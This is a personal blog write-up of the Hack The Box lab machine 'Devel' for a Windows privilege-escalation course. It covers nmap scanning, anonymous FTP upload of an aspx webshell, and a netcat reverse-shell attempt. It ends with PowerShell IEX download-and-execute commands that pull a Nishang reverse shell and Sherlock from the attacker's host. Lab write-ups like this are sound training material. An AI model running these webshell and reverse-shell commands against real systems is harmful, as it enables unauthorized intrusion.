---
layout: post
title:  "Write Up: Hack The Box - Devel"
date:   2024-08-11 11:33:17 -0400
categories: oscp windows priv-esc tcm-security course
---

in this post going to walkthrough the [HTB](https://www.hackthebox.com) box Devel today as a part of [doing the cybermentors windows priv esc](2024-08-11-cybermentor-win-priv-esc.md) course.

10.10.10.5


Loading the site in browser it looks like an IIS7 splash page, I see the following in wappalyzer:


Web frameworks
	Microsoft ASP.NET
Web servers
	IIS 7.5
Operating systems
	Windows Server
	
Doesn't seem to be much more to do on this page so we put a pin in it for now and check back on our nmmap results:

```
└─$ sudo nmap -sC -sV -p- -oA devel 10.10.10.5     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 16:10 EDT
Nmap scan report for 10.10.10.5
Host is up (0.021s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.90 seconds
```

So in addition to port 80 the server also has the FTP (21) port open and based on our nmap results we can see that anonymous auth is allowed so lets go poke through that. There isnt much when logged in anonymously but I went ahead and pulled down all the files with:

> wget -m ftp://anonymous:anonymous@10.10.10.5

Getting the feeling I am going to need to upload a file to trigger a reverse shell so look through the files located on my kali box under /usr/share/webshells/ and lo and behold there is an aspx version so we should in theory be able to use this since as we have seen the server is running asp.net on IIS 7.5. So we log back in anonymously to devel via ftp and this time we upload cmdasp.aspx to the sever and then access it via a browser and we got this nifty little screen at http://10.10.10.5/cmdasp.aspx:

[screenshot]

I try running a couple items in there to get a shell such as 
> nc.exe -e cmd.exe 10.10.14.14 1234
to try and get a shell without much luck. After banging my head on the desk for a couple mins and getting the required flat forehead I remember that we can upload files via ftp so lets try uploading some malicoousness. I copy the file /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 to my directory for this box and open it up in vim:

[screenshot]

Looks like we should be able to just upload this to the server and then pass my listener ip and port via a parameter. Soooo we open back up an ftp session and upload our file:

[screenshot]

I then go back to our reverse shell screen and try running the script using variations of

> Invoke-PowerShellTcp.ps1 10.10.14.14 1234

without much success so I try another tact. I host the file locally using python3
[screenshot]
and then I updated the script to call itself with the parameters I want by adding the following line to the bottom of the script:
[screenshot]
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4444

This will now let me run the following in our handy reverse shell webpage:

> powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/Invoke-PowerShellTcp.ps1')"

and now we have our foothold!

[screenshot]

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/Sherlock.ps1'); Find-AllVulns"



 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059


====================================================
alt foothold - use msfvenom to gen reverse shell payload and try accessing that... resesrch and make it happen!
